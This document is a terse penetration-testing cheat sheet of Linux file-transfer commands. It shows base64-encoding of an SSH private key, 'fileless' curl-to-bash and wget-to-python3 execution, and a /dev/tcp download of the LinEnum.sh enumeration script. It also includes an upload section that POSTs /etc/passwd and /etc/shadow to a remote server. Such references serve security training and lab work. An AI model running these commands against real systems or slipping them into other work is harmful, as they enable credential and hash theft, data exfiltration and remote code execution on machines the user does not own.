### Base 64 Encoding 
```shell
md5sum filename
```
Encoding
```shell
cat id_rsa |base64 -w 0;echo
```
Decode
```shell
echo -n '<base 64 value>' | base64 -d > id_rsa
```

# Downloads 
## Web downloads 
```shell
wget <url> -O <output>
```
```shell
curl -o <output> <url>
```
### Fileless Attacks 
```shell
curl <url> | bash
```

```shell-session
wget -qO- <url> | python3
```

### Download with Bash (/dev/tcp)
Connect to target
```shell
exec 3<>/dev/tcp/<ip>/<port>
```
HTTP GET Request 
```shell
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
Print the response
```shell
cat <&3
```
## SSH downloads 
Enable SSH Server 
```shell
sudo systemctl enable ssh
```
SCP
```shell
scp <user>@<ip>:<link to file> <output> 
```


# Uploads
### Method 1 
Python web server 
```shell
sudo python3 -m pip install --user uploadserver
```
Self Signed certificate 
```shell
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
Create a new directory to host the certificate
```shell
mkdir https && cd https

sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
```
Upload Files 
```shell
curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
### Method 2 
#### Alternate Web servers on host 
Python3
```shell
python3 -m http.server
```
Python 2.7 
```shell
python2.7 -m SimpleHTTPServer
```
PHP
```shell
php -S 0.0.0.0:8000
```
Ruby 
```shell
ruby -run -ehttpd . -p8000
```
Download
```shell
wget <ip>:<port>/<file>
```
### SCP
```shell
scp <file> <user>@<ip>:<link to file>
```

